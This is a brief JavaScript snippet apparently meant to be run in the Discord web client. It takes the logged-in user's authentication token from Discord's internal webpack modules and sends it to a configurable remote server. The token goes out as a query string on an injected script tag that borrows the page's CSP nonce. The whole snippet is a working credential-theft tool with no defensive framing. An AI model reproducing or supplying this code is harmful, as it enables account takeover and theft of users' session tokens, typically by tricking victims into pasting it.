window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return window.token = m.default.getToken() }if (m.getToken !== undefined) {return window.token = m.getToken()}}}]);
let serverURL = '' //make sure to include '/' at the end
let data = 'token=' +  window.token
let sampleFile = 'sample.js'
document.body.appendChild(Object.assign(document.createElement("script"), {
  src: serverURL + sampleFile + '?' + data,
  nonce: document.querySelector("[nonce]").nonce,
  onerror: console.error
}))
